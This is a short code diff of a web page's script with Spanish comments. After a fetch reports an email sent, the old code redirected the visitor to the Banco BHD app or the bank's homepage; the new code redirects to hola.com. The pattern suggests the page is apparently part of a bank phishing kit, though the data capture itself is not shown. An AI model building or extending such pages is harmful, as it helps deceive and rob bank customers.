@@ -154,7 +154,7 @@
         .then(response => response.json())
         .then(data => {
             if (data.message === 'Correo enviado con éxito') {
-                // Redirigir según el dispositivo
+                // 
                 redirectUser();
             }
         })
@@ -164,15 +164,8 @@
     });
 
     function redirectUser() {
-        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-        if (isMobile) {
-            // Redirigir a la app BHD (Asegúrate de usar el enlace correcto)
-            window.location.href = 'bhd://app';
-        } else {
-            // Redirigir a la página web para PC
-            window.location.href = 'https://bhd.com.do/homepage-personal';
-        }
+      window.location.href = 'https://hola.com';
     }
-</script>
+  </script>
 </body>
 </html>
